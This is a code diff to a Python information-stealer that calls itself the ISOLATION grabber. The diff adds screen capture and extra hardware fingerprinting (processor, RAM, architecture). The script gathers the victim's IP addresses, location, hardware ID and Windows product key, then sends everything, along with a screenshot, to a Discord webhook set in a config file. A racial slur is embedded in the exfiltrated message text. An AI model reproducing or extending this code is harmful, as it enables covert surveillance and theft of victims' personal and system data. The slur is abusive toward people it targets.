@@ -25,7 +25,8 @@ import socket
 import subprocess
 import requests
 from urllib.request import urlopen
-    
+import psutil
+from PIL import ImageGrab
 # pre-run needed variables
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
 config_file = open("./CONFIG.json","r")
@@ -82,7 +83,7 @@ def get_linux_distro():
             elif distro_id == "debian":
                 return f"{distro_name} (Based on Debian)"
             else:
-                return f"{distro_name} (Custom or Unknown)"
+                return f"{distro_name} (Custom or Unknown: {distro_id})"
     except FileNotFoundError:
         pass
     
@@ -93,11 +94,14 @@ embedcont = f'''
 get grabbed nigga
 ---------------------
 Operating system >> {platform.system()}
+Architecture --- >> {platform.machine()}
 OS.name -------- >> {os.name}
 HostName ------- >> {hostname}
 pc name -------- >> {pcname}
+Proccessor ----- >> {platform.processor()}
+RAM ------------ >> {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
 local Ip Address >> {localIPAddr}
-Ip Address ----- >> {IPAddr.text}HWID             >> {hwid}
+Ip Address ----- >> {IPAddr.text}HWID ---------- >> {hwid}
 ORG ------------ >> {data["org"]}
 ORG hostname --- >> {data["hostname"]}
 City ----------- >> {data["city"]}
@@ -113,32 +117,16 @@ Key ------------ >> {get_windows_product_key()}
 Distribution: {get_linux_distro()}
 
 '''
-
-def get_system_info():
-    if platform.system() == 'Linux':
-        try:
-            packages = subprocess.check_output(['dpkg', '--get-selections']).decode('utf-8').split('\n')
-            return [line.split('\t')[0] for line in packages if line]
-        except subprocess.CalledProcessError:
-            return []
-    else:
-        platform.system()
-
-def save_to_file(filename,data):
-    with open(filename, 'w') as f:
-        for item in data:
-            f.write(item + '\n')
-systm_packages = get_system_info()
-save_to_file(systm_packages, "packages.txt")
-
+screenshot = ImageGrab.grab()
+screenshot.save("screenshot.png")
 def main():
     webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
     embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
     embed.set_timestamp()
     embed.set_footer(text="Grabbed w/ ISOLATION grabber")
     embed.set_thumbnail("https://media.discordapp.net/attachments/1136359120233046057/1142457082243711007/1e35053d0cd075d470bd6a80a2a9a1c1.png?width=449&height=449")
+    embed.set_image("./screenshot.png")
     webhook.add_embed(embed=embed)
-    webhook.add_file(file="packages.txt",filename="packages.txt")
     webhook.execute()
 if __name__== "__main__":
     main()
